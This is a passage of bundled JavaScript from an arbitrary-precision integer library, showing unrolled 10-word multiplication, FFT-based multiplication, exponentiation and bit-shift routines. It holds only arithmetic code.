                        (mid = ((mid = (mid + Math.imul(al3, bh2)) | 0) + Math.imul(ah3, bl2)) | 0),
                        (hi = (hi + Math.imul(ah3, bh2)) | 0),
                        (lo = (lo + Math.imul(al2, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh3)) | 0) + Math.imul(ah2, bl3)) | 0),
                        (hi = (hi + Math.imul(ah2, bh3)) | 0),
                        (lo = (lo + Math.imul(al1, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh4)) | 0) + Math.imul(ah1, bl4)) | 0),
                        (hi = (hi + Math.imul(ah1, bh4)) | 0);
                    var w5 = (((c + (lo = (lo + Math.imul(al0, bl5)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh5)) | 0) + Math.imul(ah0, bl5)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh5)) | 0) + (mid >>> 13)) | 0) + (w5 >>> 26)) | 0),
                        (w5 &= 67108863),
                        (lo = Math.imul(al6, bl0)),
                        (mid = ((mid = Math.imul(al6, bh0)) + Math.imul(ah6, bl0)) | 0),
                        (hi = Math.imul(ah6, bh0)),
                        (lo = (lo + Math.imul(al5, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh1)) | 0) + Math.imul(ah5, bl1)) | 0),
                        (hi = (hi + Math.imul(ah5, bh1)) | 0),
                        (lo = (lo + Math.imul(al4, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh2)) | 0) + Math.imul(ah4, bl2)) | 0),
                        (hi = (hi + Math.imul(ah4, bh2)) | 0),
                        (lo = (lo + Math.imul(al3, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh3)) | 0) + Math.imul(ah3, bl3)) | 0),
                        (hi = (hi + Math.imul(ah3, bh3)) | 0),
                        (lo = (lo + Math.imul(al2, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh4)) | 0) + Math.imul(ah2, bl4)) | 0),
                        (hi = (hi + Math.imul(ah2, bh4)) | 0),
                        (lo = (lo + Math.imul(al1, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh5)) | 0) + Math.imul(ah1, bl5)) | 0),
                        (hi = (hi + Math.imul(ah1, bh5)) | 0);
                    var w6 = (((c + (lo = (lo + Math.imul(al0, bl6)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh6)) | 0) + Math.imul(ah0, bl6)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh6)) | 0) + (mid >>> 13)) | 0) + (w6 >>> 26)) | 0),
                        (w6 &= 67108863),
                        (lo = Math.imul(al7, bl0)),
                        (mid = ((mid = Math.imul(al7, bh0)) + Math.imul(ah7, bl0)) | 0),
                        (hi = Math.imul(ah7, bh0)),
                        (lo = (lo + Math.imul(al6, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh1)) | 0) + Math.imul(ah6, bl1)) | 0),
                        (hi = (hi + Math.imul(ah6, bh1)) | 0),
                        (lo = (lo + Math.imul(al5, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh2)) | 0) + Math.imul(ah5, bl2)) | 0),
                        (hi = (hi + Math.imul(ah5, bh2)) | 0),
                        (lo = (lo + Math.imul(al4, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh3)) | 0) + Math.imul(ah4, bl3)) | 0),
                        (hi = (hi + Math.imul(ah4, bh3)) | 0),
                        (lo = (lo + Math.imul(al3, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh4)) | 0) + Math.imul(ah3, bl4)) | 0),
                        (hi = (hi + Math.imul(ah3, bh4)) | 0),
                        (lo = (lo + Math.imul(al2, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh5)) | 0) + Math.imul(ah2, bl5)) | 0),
                        (hi = (hi + Math.imul(ah2, bh5)) | 0),
                        (lo = (lo + Math.imul(al1, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh6)) | 0) + Math.imul(ah1, bl6)) | 0),
                        (hi = (hi + Math.imul(ah1, bh6)) | 0);
                    var w7 = (((c + (lo = (lo + Math.imul(al0, bl7)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh7)) | 0) + Math.imul(ah0, bl7)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh7)) | 0) + (mid >>> 13)) | 0) + (w7 >>> 26)) | 0),
                        (w7 &= 67108863),
                        (lo = Math.imul(al8, bl0)),
                        (mid = ((mid = Math.imul(al8, bh0)) + Math.imul(ah8, bl0)) | 0),
                        (hi = Math.imul(ah8, bh0)),
                        (lo = (lo + Math.imul(al7, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh1)) | 0) + Math.imul(ah7, bl1)) | 0),
                        (hi = (hi + Math.imul(ah7, bh1)) | 0),
                        (lo = (lo + Math.imul(al6, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh2)) | 0) + Math.imul(ah6, bl2)) | 0),
                        (hi = (hi + Math.imul(ah6, bh2)) | 0),
                        (lo = (lo + Math.imul(al5, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh3)) | 0) + Math.imul(ah5, bl3)) | 0),
                        (hi = (hi + Math.imul(ah5, bh3)) | 0),
                        (lo = (lo + Math.imul(al4, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh4)) | 0) + Math.imul(ah4, bl4)) | 0),
                        (hi = (hi + Math.imul(ah4, bh4)) | 0),
                        (lo = (lo + Math.imul(al3, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh5)) | 0) + Math.imul(ah3, bl5)) | 0),
                        (hi = (hi + Math.imul(ah3, bh5)) | 0),
                        (lo = (lo + Math.imul(al2, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh6)) | 0) + Math.imul(ah2, bl6)) | 0),
                        (hi = (hi + Math.imul(ah2, bh6)) | 0),
                        (lo = (lo + Math.imul(al1, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh7)) | 0) + Math.imul(ah1, bl7)) | 0),
                        (hi = (hi + Math.imul(ah1, bh7)) | 0);
                    var w8 = (((c + (lo = (lo + Math.imul(al0, bl8)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh8)) | 0) + Math.imul(ah0, bl8)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh8)) | 0) + (mid >>> 13)) | 0) + (w8 >>> 26)) | 0),
                        (w8 &= 67108863),
                        (lo = Math.imul(al9, bl0)),
                        (mid = ((mid = Math.imul(al9, bh0)) + Math.imul(ah9, bl0)) | 0),
                        (hi = Math.imul(ah9, bh0)),
                        (lo = (lo + Math.imul(al8, bl1)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh1)) | 0) + Math.imul(ah8, bl1)) | 0),
                        (hi = (hi + Math.imul(ah8, bh1)) | 0),
                        (lo = (lo + Math.imul(al7, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh2)) | 0) + Math.imul(ah7, bl2)) | 0),
                        (hi = (hi + Math.imul(ah7, bh2)) | 0),
                        (lo = (lo + Math.imul(al6, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh3)) | 0) + Math.imul(ah6, bl3)) | 0),
                        (hi = (hi + Math.imul(ah6, bh3)) | 0),
                        (lo = (lo + Math.imul(al5, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh4)) | 0) + Math.imul(ah5, bl4)) | 0),
                        (hi = (hi + Math.imul(ah5, bh4)) | 0),
                        (lo = (lo + Math.imul(al4, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh5)) | 0) + Math.imul(ah4, bl5)) | 0),
                        (hi = (hi + Math.imul(ah4, bh5)) | 0),
                        (lo = (lo + Math.imul(al3, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh6)) | 0) + Math.imul(ah3, bl6)) | 0),
                        (hi = (hi + Math.imul(ah3, bh6)) | 0),
                        (lo = (lo + Math.imul(al2, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh7)) | 0) + Math.imul(ah2, bl7)) | 0),
                        (hi = (hi + Math.imul(ah2, bh7)) | 0),
                        (lo = (lo + Math.imul(al1, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al1, bh8)) | 0) + Math.imul(ah1, bl8)) | 0),
                        (hi = (hi + Math.imul(ah1, bh8)) | 0);
                    var w9 = (((c + (lo = (lo + Math.imul(al0, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al0, bh9)) | 0) + Math.imul(ah0, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah0, bh9)) | 0) + (mid >>> 13)) | 0) + (w9 >>> 26)) | 0),
                        (w9 &= 67108863),
                        (lo = Math.imul(al9, bl1)),
                        (mid = ((mid = Math.imul(al9, bh1)) + Math.imul(ah9, bl1)) | 0),
                        (hi = Math.imul(ah9, bh1)),
                        (lo = (lo + Math.imul(al8, bl2)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh2)) | 0) + Math.imul(ah8, bl2)) | 0),
                        (hi = (hi + Math.imul(ah8, bh2)) | 0),
                        (lo = (lo + Math.imul(al7, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh3)) | 0) + Math.imul(ah7, bl3)) | 0),
                        (hi = (hi + Math.imul(ah7, bh3)) | 0),
                        (lo = (lo + Math.imul(al6, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh4)) | 0) + Math.imul(ah6, bl4)) | 0),
                        (hi = (hi + Math.imul(ah6, bh4)) | 0),
                        (lo = (lo + Math.imul(al5, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh5)) | 0) + Math.imul(ah5, bl5)) | 0),
                        (hi = (hi + Math.imul(ah5, bh5)) | 0),
                        (lo = (lo + Math.imul(al4, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh6)) | 0) + Math.imul(ah4, bl6)) | 0),
                        (hi = (hi + Math.imul(ah4, bh6)) | 0),
                        (lo = (lo + Math.imul(al3, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh7)) | 0) + Math.imul(ah3, bl7)) | 0),
                        (hi = (hi + Math.imul(ah3, bh7)) | 0),
                        (lo = (lo + Math.imul(al2, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al2, bh8)) | 0) + Math.imul(ah2, bl8)) | 0),
                        (hi = (hi + Math.imul(ah2, bh8)) | 0);
                    var w10 = (((c + (lo = (lo + Math.imul(al1, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al1, bh9)) | 0) + Math.imul(ah1, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah1, bh9)) | 0) + (mid >>> 13)) | 0) + (w10 >>> 26)) | 0),
                        (w10 &= 67108863),
                        (lo = Math.imul(al9, bl2)),
                        (mid = ((mid = Math.imul(al9, bh2)) + Math.imul(ah9, bl2)) | 0),
                        (hi = Math.imul(ah9, bh2)),
                        (lo = (lo + Math.imul(al8, bl3)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh3)) | 0) + Math.imul(ah8, bl3)) | 0),
                        (hi = (hi + Math.imul(ah8, bh3)) | 0),
                        (lo = (lo + Math.imul(al7, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh4)) | 0) + Math.imul(ah7, bl4)) | 0),
                        (hi = (hi + Math.imul(ah7, bh4)) | 0),
                        (lo = (lo + Math.imul(al6, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh5)) | 0) + Math.imul(ah6, bl5)) | 0),
                        (hi = (hi + Math.imul(ah6, bh5)) | 0),
                        (lo = (lo + Math.imul(al5, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh6)) | 0) + Math.imul(ah5, bl6)) | 0),
                        (hi = (hi + Math.imul(ah5, bh6)) | 0),
                        (lo = (lo + Math.imul(al4, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh7)) | 0) + Math.imul(ah4, bl7)) | 0),
                        (hi = (hi + Math.imul(ah4, bh7)) | 0),
                        (lo = (lo + Math.imul(al3, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al3, bh8)) | 0) + Math.imul(ah3, bl8)) | 0),
                        (hi = (hi + Math.imul(ah3, bh8)) | 0);
                    var w11 = (((c + (lo = (lo + Math.imul(al2, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al2, bh9)) | 0) + Math.imul(ah2, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah2, bh9)) | 0) + (mid >>> 13)) | 0) + (w11 >>> 26)) | 0),
                        (w11 &= 67108863),
                        (lo = Math.imul(al9, bl3)),
                        (mid = ((mid = Math.imul(al9, bh3)) + Math.imul(ah9, bl3)) | 0),
                        (hi = Math.imul(ah9, bh3)),
                        (lo = (lo + Math.imul(al8, bl4)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh4)) | 0) + Math.imul(ah8, bl4)) | 0),
                        (hi = (hi + Math.imul(ah8, bh4)) | 0),
                        (lo = (lo + Math.imul(al7, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh5)) | 0) + Math.imul(ah7, bl5)) | 0),
                        (hi = (hi + Math.imul(ah7, bh5)) | 0),
                        (lo = (lo + Math.imul(al6, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh6)) | 0) + Math.imul(ah6, bl6)) | 0),
                        (hi = (hi + Math.imul(ah6, bh6)) | 0),
                        (lo = (lo + Math.imul(al5, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh7)) | 0) + Math.imul(ah5, bl7)) | 0),
                        (hi = (hi + Math.imul(ah5, bh7)) | 0),
                        (lo = (lo + Math.imul(al4, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al4, bh8)) | 0) + Math.imul(ah4, bl8)) | 0),
                        (hi = (hi + Math.imul(ah4, bh8)) | 0);
                    var w12 = (((c + (lo = (lo + Math.imul(al3, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al3, bh9)) | 0) + Math.imul(ah3, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah3, bh9)) | 0) + (mid >>> 13)) | 0) + (w12 >>> 26)) | 0),
                        (w12 &= 67108863),
                        (lo = Math.imul(al9, bl4)),
                        (mid = ((mid = Math.imul(al9, bh4)) + Math.imul(ah9, bl4)) | 0),
                        (hi = Math.imul(ah9, bh4)),
                        (lo = (lo + Math.imul(al8, bl5)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh5)) | 0) + Math.imul(ah8, bl5)) | 0),
                        (hi = (hi + Math.imul(ah8, bh5)) | 0),
                        (lo = (lo + Math.imul(al7, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh6)) | 0) + Math.imul(ah7, bl6)) | 0),
                        (hi = (hi + Math.imul(ah7, bh6)) | 0),
                        (lo = (lo + Math.imul(al6, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh7)) | 0) + Math.imul(ah6, bl7)) | 0),
                        (hi = (hi + Math.imul(ah6, bh7)) | 0),
                        (lo = (lo + Math.imul(al5, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al5, bh8)) | 0) + Math.imul(ah5, bl8)) | 0),
                        (hi = (hi + Math.imul(ah5, bh8)) | 0);
                    var w13 = (((c + (lo = (lo + Math.imul(al4, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al4, bh9)) | 0) + Math.imul(ah4, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah4, bh9)) | 0) + (mid >>> 13)) | 0) + (w13 >>> 26)) | 0),
                        (w13 &= 67108863),
                        (lo = Math.imul(al9, bl5)),
                        (mid = ((mid = Math.imul(al9, bh5)) + Math.imul(ah9, bl5)) | 0),
                        (hi = Math.imul(ah9, bh5)),
                        (lo = (lo + Math.imul(al8, bl6)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh6)) | 0) + Math.imul(ah8, bl6)) | 0),
                        (hi = (hi + Math.imul(ah8, bh6)) | 0),
                        (lo = (lo + Math.imul(al7, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh7)) | 0) + Math.imul(ah7, bl7)) | 0),
                        (hi = (hi + Math.imul(ah7, bh7)) | 0),
                        (lo = (lo + Math.imul(al6, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al6, bh8)) | 0) + Math.imul(ah6, bl8)) | 0),
                        (hi = (hi + Math.imul(ah6, bh8)) | 0);
                    var w14 = (((c + (lo = (lo + Math.imul(al5, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al5, bh9)) | 0) + Math.imul(ah5, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah5, bh9)) | 0) + (mid >>> 13)) | 0) + (w14 >>> 26)) | 0),
                        (w14 &= 67108863),
                        (lo = Math.imul(al9, bl6)),
                        (mid = ((mid = Math.imul(al9, bh6)) + Math.imul(ah9, bl6)) | 0),
                        (hi = Math.imul(ah9, bh6)),
                        (lo = (lo + Math.imul(al8, bl7)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh7)) | 0) + Math.imul(ah8, bl7)) | 0),
                        (hi = (hi + Math.imul(ah8, bh7)) | 0),
                        (lo = (lo + Math.imul(al7, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al7, bh8)) | 0) + Math.imul(ah7, bl8)) | 0),
                        (hi = (hi + Math.imul(ah7, bh8)) | 0);
                    var w15 = (((c + (lo = (lo + Math.imul(al6, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al6, bh9)) | 0) + Math.imul(ah6, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah6, bh9)) | 0) + (mid >>> 13)) | 0) + (w15 >>> 26)) | 0),
                        (w15 &= 67108863),
                        (lo = Math.imul(al9, bl7)),
                        (mid = ((mid = Math.imul(al9, bh7)) + Math.imul(ah9, bl7)) | 0),
                        (hi = Math.imul(ah9, bh7)),
                        (lo = (lo + Math.imul(al8, bl8)) | 0),
                        (mid = ((mid = (mid + Math.imul(al8, bh8)) | 0) + Math.imul(ah8, bl8)) | 0),
                        (hi = (hi + Math.imul(ah8, bh8)) | 0);
                    var w16 = (((c + (lo = (lo + Math.imul(al7, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al7, bh9)) | 0) + Math.imul(ah7, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah7, bh9)) | 0) + (mid >>> 13)) | 0) + (w16 >>> 26)) | 0),
                        (w16 &= 67108863),
                        (lo = Math.imul(al9, bl8)),
                        (mid = ((mid = Math.imul(al9, bh8)) + Math.imul(ah9, bl8)) | 0),
                        (hi = Math.imul(ah9, bh8));
                    var w17 = (((c + (lo = (lo + Math.imul(al8, bl9)) | 0)) | 0) + ((8191 & (mid = ((mid = (mid + Math.imul(al8, bh9)) | 0) + Math.imul(ah8, bl9)) | 0)) << 13)) | 0;
                    (c = ((((hi = (hi + Math.imul(ah8, bh9)) | 0) + (mid >>> 13)) | 0) + (w17 >>> 26)) | 0), (w17 &= 67108863);
                    var w18 = (((c + (lo = Math.imul(al9, bl9))) | 0) + ((8191 & (mid = ((mid = Math.imul(al9, bh9)) + Math.imul(ah9, bl9)) | 0)) << 13)) | 0;
                    return (
                        (c = ((((hi = Math.imul(ah9, bh9)) + (mid >>> 13)) | 0) + (w18 >>> 26)) | 0),
                        (w18 &= 67108863),
                        (o[0] = w0),
                        (o[1] = w1),
                        (o[2] = w2),
                        (o[3] = w3),
                        (o[4] = w4),
                        (o[5] = w5),
                        (o[6] = w6),
                        (o[7] = w7),
                        (o[8] = w8),
                        (o[9] = w9),
                        (o[10] = w10),
                        (o[11] = w11),
                        (o[12] = w12),
                        (o[13] = w13),
                        (o[14] = w14),
                        (o[15] = w15),
                        (o[16] = w16),
                        (o[17] = w17),
                        (o[18] = w18),
                        0 !== c && ((o[19] = c), out.length++),
                        out
                    );
                };
                function jumboMulTo(self, num, out) {
                    return new FFTM().mulp(self, num, out);
                }
                function FFTM(x, y) {
                    (this.x = x), (this.y = y);
                }
                Math.imul || (comb10MulTo = smallMulTo),
                    (BN.prototype.mulTo = function (num, out) {
                        var len = this.length + num.length;
                        return 10 === this.length && 10 === num.length
                            ? comb10MulTo(this, num, out)
                            : len < 63
                            ? smallMulTo(this, num, out)
                            : len < 1024
                            ? (function (self, num, out) {
                                  (out.negative = num.negative ^ self.negative), (out.length = self.length + num.length);
                                  for (var carry = 0, hncarry = 0, k = 0; k < out.length - 1; k++) {
                                      var ncarry = hncarry;
                                      hncarry = 0;
                                      for (var rword = 67108863 & carry, maxJ = Math.min(k, num.length - 1), j = Math.max(0, k - self.length + 1); j <= maxJ; j++) {
                                          var i = k - j,
                                              r = (0 | self.words[i]) * (0 | num.words[j]),
                                              lo = 67108863 & r;
                                          (rword = 67108863 & (lo = (lo + rword) | 0)), (hncarry += (ncarry = ((ncarry = (ncarry + ((r / 67108864) | 0)) | 0) + (lo >>> 26)) | 0) >>> 26), (ncarry &= 67108863);
                                      }
                                      (out.words[k] = rword), (carry = ncarry), (ncarry = hncarry);
                                  }
                                  return 0 !== carry ? (out.words[k] = carry) : out.length--, out.strip();
                              })(this, num, out)
                            : jumboMulTo(this, num, out);
                    }),
                    (FFTM.prototype.makeRBT = function (N) {
                        for (var t = new Array(N), l = BN.prototype._countBits(N) - 1, i = 0; i < N; i++) t[i] = this.revBin(i, l, N);
                        return t;
                    }),
                    (FFTM.prototype.revBin = function (x, l, N) {
                        if (0 === x || x === N - 1) return x;
                        for (var rb = 0, i = 0; i < l; i++) (rb |= (1 & x) << (l - i - 1)), (x >>= 1);
                        return rb;
                    }),
                    (FFTM.prototype.permute = function (rbt, rws, iws, rtws, itws, N) {
                        for (var i = 0; i < N; i++) (rtws[i] = rws[rbt[i]]), (itws[i] = iws[rbt[i]]);
                    }),
                    (FFTM.prototype.transform = function (rws, iws, rtws, itws, N, rbt) {
                        this.permute(rbt, rws, iws, rtws, itws, N);
                        for (var s = 1; s < N; s <<= 1)
                            for (var l = s << 1, rtwdf = Math.cos((2 * Math.PI) / l), itwdf = Math.sin((2 * Math.PI) / l), p = 0; p < N; p += l)
                                for (var rtwdf_ = rtwdf, itwdf_ = itwdf, j = 0; j < s; j++) {
                                    var re = rtws[p + j],
                                        ie = itws[p + j],
                                        ro = rtws[p + j + s],
                                        io = itws[p + j + s],
                                        rx = rtwdf_ * ro - itwdf_ * io;
                                    (io = rtwdf_ * io + itwdf_ * ro),
                                        (ro = rx),
                                        (rtws[p + j] = re + ro),
                                        (itws[p + j] = ie + io),
                                        (rtws[p + j + s] = re - ro),
                                        (itws[p + j + s] = ie - io),
                                        j !== l && ((rx = rtwdf * rtwdf_ - itwdf * itwdf_), (itwdf_ = rtwdf * itwdf_ + itwdf * rtwdf_), (rtwdf_ = rx));
                                }
                    }),
                    (FFTM.prototype.guessLen13b = function (n, m) {
                        var N = 1 | Math.max(m, n),
                            odd = 1 & N,
                            i = 0;
                        for (N = (N / 2) | 0; N; N >>>= 1) i++;
                        return 1 << (i + 1 + odd);
                    }),
                    (FFTM.prototype.conjugate = function (rws, iws, N) {
                        if (!(N <= 1))
                            for (var i = 0; i < N / 2; i++) {
                                var t = rws[i];
                                (rws[i] = rws[N - i - 1]), (rws[N - i - 1] = t), (t = iws[i]), (iws[i] = -iws[N - i - 1]), (iws[N - i - 1] = -t);
                            }
                    }),
                    (FFTM.prototype.normalize13b = function (ws, N) {
                        for (var carry = 0, i = 0; i < N / 2; i++) {
                            var w = 8192 * Math.round(ws[2 * i + 1] / N) + Math.round(ws[2 * i] / N) + carry;
                            (ws[i] = 67108863 & w), (carry = w < 67108864 ? 0 : (w / 67108864) | 0);
                        }
                        return ws;
                    }),
                    (FFTM.prototype.convert13b = function (ws, len, rws, N) {
                        for (var carry = 0, i = 0; i < len; i++) (carry += 0 | ws[i]), (rws[2 * i] = 8191 & carry), (carry >>>= 13), (rws[2 * i + 1] = 8191 & carry), (carry >>>= 13);
                        for (i = 2 * len; i < N; ++i) rws[i] = 0;
                        assert(0 === carry), assert(0 == (-8192 & carry));
                    }),
                    (FFTM.prototype.stub = function (N) {
                        for (var ph = new Array(N), i = 0; i < N; i++) ph[i] = 0;
                        return ph;
                    }),
                    (FFTM.prototype.mulp = function (x, y, out) {
                        var N = 2 * this.guessLen13b(x.length, y.length),
                            rbt = this.makeRBT(N),
                            _ = this.stub(N),
                            rws = new Array(N),
                            rwst = new Array(N),
                            iwst = new Array(N),
                            nrws = new Array(N),
                            nrwst = new Array(N),
                            niwst = new Array(N),
                            rmws = out.words;
                        (rmws.length = N), this.convert13b(x.words, x.length, rws, N), this.convert13b(y.words, y.length, nrws, N), this.transform(rws, _, rwst, iwst, N, rbt), this.transform(nrws, _, nrwst, niwst, N, rbt);
                        for (var i = 0; i < N; i++) {
                            var rx = rwst[i] * nrwst[i] - iwst[i] * niwst[i];
                            (iwst[i] = rwst[i] * niwst[i] + iwst[i] * nrwst[i]), (rwst[i] = rx);
                        }
                        return (
                            this.conjugate(rwst, iwst, N),
                            this.transform(rwst, iwst, rmws, _, N, rbt),
                            this.conjugate(rmws, _, N),
                            this.normalize13b(rmws, N),
                            (out.negative = x.negative ^ y.negative),
                            (out.length = x.length + y.length),
                            out.strip()
                        );
                    }),
                    (BN.prototype.mul = function (num) {
                        var out = new BN(null);
                        return (out.words = new Array(this.length + num.length)), this.mulTo(num, out);
                    }),
                    (BN.prototype.mulf = function (num) {
                        var out = new BN(null);
                        return (out.words = new Array(this.length + num.length)), jumboMulTo(this, num, out);
                    }),
                    (BN.prototype.imul = function (num) {
                        return this.clone().mulTo(num, this);
                    }),
                    (BN.prototype.imuln = function (num) {
                        assert("number" == typeof num), assert(num < 67108864);
                        for (var carry = 0, i = 0; i < this.length; i++) {
                            var w = (0 | this.words[i]) * num,
                                lo = (67108863 & w) + (67108863 & carry);
                            (carry >>= 26), (carry += (w / 67108864) | 0), (carry += lo >>> 26), (this.words[i] = 67108863 & lo);
                        }
                        return 0 !== carry && ((this.words[i] = carry), this.length++), this;
                    }),
                    (BN.prototype.muln = function (num) {
                        return this.clone().imuln(num);
                    }),
                    (BN.prototype.sqr = function () {
                        return this.mul(this);
                    }),
                    (BN.prototype.isqr = function () {
                        return this.imul(this.clone());
                    }),
                    (BN.prototype.pow = function (num) {
                        var w = (function (num) {
                            for (var w = new Array(num.bitLength()), bit = 0; bit < w.length; bit++) {
                                var off = (bit / 26) | 0,
                                    wbit = bit % 26;
                                w[bit] = (num.words[off] & (1 << wbit)) >>> wbit;
                            }
                            return w;
                        })(num);
                        if (0 === w.length) return new BN(1);
                        for (var res = this, i = 0; i < w.length && 0 === w[i]; i++, res = res.sqr());
                        if (++i < w.length) for (var q = res.sqr(); i < w.length; i++, q = q.sqr()) 0 !== w[i] && (res = res.mul(q));
                        return res;
                    }),
                    (BN.prototype.iushln = function (bits) {
                        assert("number" == typeof bits && bits >= 0);
                        var i,
                            r = bits % 26,
                            s = (bits - r) / 26,
                            carryMask = (67108863 >>> (26 - r)) << (26 - r);
                        if (0 !== r) {
                            var carry = 0;
                            for (i = 0; i < this.length; i++) {
                                var newCarry = this.words[i] & carryMask,
                                    c = ((0 | this.words[i]) - newCarry) << r;
                                (this.words[i] = c | carry), (carry = newCarry >>> (26 - r));
                            }
                            carry && ((this.words[i] = carry), this.length++);
                        }
                        if (0 !== s) {
                            for (i = this.length - 1; i >= 0; i--) this.words[i + s] = this.words[i];
                            for (i = 0; i < s; i++) this.words[i] = 0;
                            this.length += s;
                        }
                        return this.strip();
                    }),
                    (BN.prototype.ishln = function (bits) {
                        return assert(0 === this.negative), this.iushln(bits);
                    }),
                    (BN.prototype.iushrn = function (bits, hint, extended) {
                        var h;
                        assert("number" == typeof bits && bits >= 0), (h = hint ? (hint - (hint % 26)) / 26 : 0);
                        var r = bits % 26,
                            s = Math.min((bits - r) / 26, this.length),
                            mask = 67108863 ^ ((67108863 >>> r) << r),
                            maskedWords = extended;
                        if (((h -= s), (h = Math.max(0, h)), maskedWords)) {
                            for (var i = 0; i < s; i++) maskedWords.words[i] = this.words[i];
                            maskedWords.length = s;
                        }
                        if (0 === s);
                        else if (this.length > s) for (this.length -= s, i = 0; i < this.length; i++) this.words[i] = this.words[i + s];
                        else (this.words[0] = 0), (this.length = 1);
                        var carry = 0;
                        for (i = this.length - 1; i >= 0 && (0 !== carry || i >= h); i--) {
                            var word = 0 | this.words[i];
                            (this.words[i] = (carry << (26 - r)) | (word >>> r)), (carry = word & mask);
                        }
                        return maskedWords && 0 !== carry && (maskedWords.words[maskedWords.length++] = carry), 0 === this.length && ((this.words[0] = 0), (this.length = 1)), this.strip();
                    }),
                    (BN.prototype.ishrn = function (bits, hint, extended) {
                        return assert(0 === this.negative), this.iushrn(bits, hint, extended);
                    }),
                    (BN.prototype.shln = function (bits) {
                        return this.clone().ishln(bits);
                    }),
                    (BN.prototype.ushln = function (bits) {
                        return this.clone().iushln(bits);
                    }),
                    (BN.prototype.shrn = function (bits) {
